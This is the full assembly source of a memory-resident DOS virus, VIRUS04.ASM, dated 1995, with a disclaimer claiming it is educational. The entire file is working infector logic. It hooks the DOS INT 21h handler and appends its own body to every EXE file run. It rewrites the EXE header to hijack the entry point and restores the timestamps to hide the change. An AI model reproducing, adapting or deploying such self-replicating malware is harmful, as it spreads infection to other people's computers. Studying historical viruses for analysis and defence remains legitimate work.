;
;	VIRUS04.ASM
;
;	Author: Johan Gardhage <johan.gardhage@gmail.com>
;	Originally written in 1995.
;
; Description:
; This virus is a resident infector of EXE files. It uses standard
; interrupt vector calls to install the int21h handler.
;
; The virus infects on execute (4b00h).
;
; Disclaimer:
; I take no responsibility for any damage, either direct or implied,
; caused by the usage of this virus source code or of the resulting code
; after assembly. The code was written for educational purposes ONLY.
;

	.model tiny
	.code
	.startup
	locals @@

VirusSize	equ	EndVirus-BeginVirus
ParagraphSize	equ	(VirusSize + 15) / 16
VirusInterrupt	equ	0d7h				; Our interrupt
VirusIdentifier	equ	0fed8h				; Our identifier

BeginVirus:
	jmp	EntryPoint

EntryPoint:
	push	ax
	pop	ax
	push	ax
	pop	ax
	call	@@next
@@next:	pop	bp
	sub	bp,offset @@next
	jmp	BeginNonEncryptedSection

BeginNonEncryptedSection:
	mov	ax,es
	add	ax,10h
	add	ax,word ptr cs:[bp+ExeHead+16h]
	push	ax
	push	word ptr cs:[bp+ExeHead+14h]

	push	ds
	push	es
	push	cs
	pop	ds

	cld
	mov	ah,VirusInterrupt			; Are we installed?
	jmp	@@next
@@next:	int	21h
	jc	InstallVirus				; Not there
	cmp	ax,VirusIdentifier			; Check again...
	jne	InstallVirus
	jmp	ExitVirus				; Exit program...

InstallVirus:
	mov	ah,4ah					; Get #of free paras
	mov	bx,0ffffh				; in bx
	int	21h

	sub	bx,ParagraphSize+1			; change..
	mov	ah,4ah
	int	21h

	mov	ah,48h					; ..allocation.
	mov	bx,ParagraphSize
	int	21h
	jc	ExitVirus

	dec	ax					; ax-1 = MCB
	mov	es,ax
	mov	word ptr es:[1],8			; Mark DOS as owner
	inc	ax
	mov	es,ax

	lea	si,[bp+BeginVirus]
	xor	di,di
	mov	cx,VirusSize
	rep	movsb					; Copy virus to mem

InstallInt21hHandler:
	push	es
	pop	ds
	mov	ax,3521h				; Hook old INT21h
	int	21h
	mov	word ptr ds:[Int21o-BeginVirus],bx
	mov	word ptr ds:[Int21s-BeginVirus],es

	mov	dx,offset Int21hHandler-BeginVirus	; Set new int21h handler
	mov	ax,2521h
	int	21h

ExitVirus:
	pop	es
	pop	ds
	retf

ExeHead	db	16h dup(0)
	dw	0fff0h					; Just for this com file
	db	4h dup(0)

;---------------------------------------------------------------------
;	New int21h handler
;---------------------------------------------------------------------

Int21hHandler:
	cmp	ah,VirusInterrupt			; Is it our call?
	jne	@@next
	mov	ax,VirusIdentifier			; Tell 'em we're here
	iret						; Jump back...
@@next:	cmp	ax,4b00h				; File executed?
	jne	OldInt21h
	call	InfectFile

OldInt21h:						; Jump to old int21h
	db	0eah
Int21o	dw	?
Int21s	dw	?

;---------------------------------------------------------------------------
;	File executed with 4B00h
;---------------------------------------------------------------------------

InfectFile:
	push	ax
	push	bx
	push	cx
	push	dx
	push	ds
	push	es
	push	bp

	push	cs
	pop	es
	cld

	mov	ax,3d02h				; Open the file..
	int	21h

	mov	bx,ax					; File handle in bx

	push	cs
	pop	ds					; The actual segment

	mov	ax,5700h				; Get date/time
	int	21h
	mov	word ptr ds:[ExeDate-100h],dx
	mov	word ptr ds:[ExeTime-100h],cx

InfectExeFile:
	mov	ax,4200h				; Position file-pointer to BOF
	xor	cx,cx
	xor	dx,dx
	int	21h

	mov	ah,3fh					; read file - 28 bytes
	mov	cx,1ch					; to ExeHead
	mov	dx,offset ExeHead-100h
	int	21h

	mov	ax,4202h				; Go EOF
	xor	cx,cx
	xor	dx,dx
	int	21h

	push	dx
	push	ax

	mov	ah,40h					; Write virus to EOF
	mov	cx,VirusSize
	mov	dx,offset BeginVirus-0100h
	int	21h

	mov	ax,4202h				; Get NEW filelenght.
	xor	cx,cx
	xor	dx,dx
	int	21h

	mov	cx,200h
	div	cx
	inc	ax
	mov	word ptr ds:[ExeHead-100h+2h],dx
	mov	word ptr ds:[ExeHead-100h+4h],ax

	pop	ax
	pop	dx

	mov	cx,10h
	div	cx
	sub	ax,word ptr ds:[ExeHead-100h+8h]
	mov	word ptr ds:[ExeHead-100h+16h],ax
	mov	word ptr ds:[ExeHead-100h+14h],dx
	mov	word ptr ds:[ExeHead-100h+12h],'RI'

	mov	ax,4200h				; Position file-pointer to BOF
	xor	cx,cx
	xor	dx,dx
	int	21h

	mov	ah,40h					; Write header
	mov	cx,1ch
	mov	dx,offset ExeHead-100h
	int	21h

	jmp	CloseFile

CloseFile:
	push	cs
	pop	ds

	mov	ax,5701h				; Restore date...
	mov	cx,word ptr ds:[ExeTime-100h]
	mov	dx,word ptr ds:[ExeDate-100h]
	int	21h

	mov	ah,3eh					; Close file..
	int	21h

	pop	bp
	pop	es
	pop	ds
	pop	dx
	pop	cx
	pop	bx
	pop	ax
	retn

ExeTime	dw	0
ExeDate	dw	0

EndVirus:

end
